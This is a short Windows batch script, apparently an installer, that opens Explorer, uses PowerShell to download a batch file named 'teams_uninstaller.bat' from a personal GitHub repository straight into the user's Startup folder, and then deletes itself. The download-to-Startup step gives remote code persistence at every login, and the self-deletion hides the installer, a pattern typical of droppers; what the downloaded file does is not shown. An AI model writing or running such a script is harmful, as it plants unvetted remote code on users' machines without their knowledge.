start explorer
start explorer

powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/sossinayDev/storage-9a/main/stuff/alcrax/teams_uninstaller.bat' -OutFile \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\teams_uninstaller.bat\"" 

del "installer.bat" 